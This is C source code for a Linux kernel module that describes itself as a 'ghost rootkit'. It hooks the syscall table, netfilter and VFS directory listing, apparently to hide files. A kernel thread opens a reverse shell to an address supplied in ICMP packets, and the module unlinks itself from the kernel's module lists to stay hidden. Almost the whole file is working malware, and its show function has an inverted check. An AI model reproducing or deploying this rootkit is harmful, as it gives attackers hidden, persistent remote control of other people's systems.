#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/syscalls.h>
#include "syscalltable.h"
#include "netfilter_hook.h"
#include "shellutil.h"
#include "vfs_hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2y30r <ylbhz@hotmail.com>");
MODULE_DESCRIPTION("ghost rootkit module");

static int lkm_thread(void* arg);
static struct task_struct *tsk;
static bool ishidden = false;

void module_hide(void);

static int ghost_init(void)
{		
	if(!init_syscall()) return 0;
	nf_reg_hook();
	vfs_hook("/", &vfs_module.iterate, new_iterate);
	tsk = kthread_run(lkm_thread, NULL, "lkm_thread"); //启动线程
	
	module_hide();
	
	return 0;
}

static void ghost_exit(void)
{
	if(!g_syscalltable) return;
	nf_reg_unhook();
	vfs_unhook("/", vfs_module.iterate);
	kthread_stop(tsk);
}

module_init(ghost_init);
module_exit(ghost_exit);

static int lkm_thread(void* arg)
{
	while(!kthread_should_stop())
	{
		set_current_state(TASK_UNINTERRUPTIBLE);
		schedule_timeout(1*HZ);
		
		if(!rshell) continue;
		rshell = false;
		kbackshell(icmpdata->param.ip, icmpdata->param.port);
	}
	
	return 0;
}

static struct list_head *mod_prev = NULL;
static struct list_head *kobj_prev = NULL;

void module_hide(void)
{
	if(ishidden)
		return;
	mod_prev = THIS_MODULE->list.prev;
	kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
	
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	ishidden = true;
}
void module_show(void)
{
	if (ishidden)
		return;
	list_add(&THIS_MODULE->list, mod_prev);
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "ghost");
	ishidden = false;
}
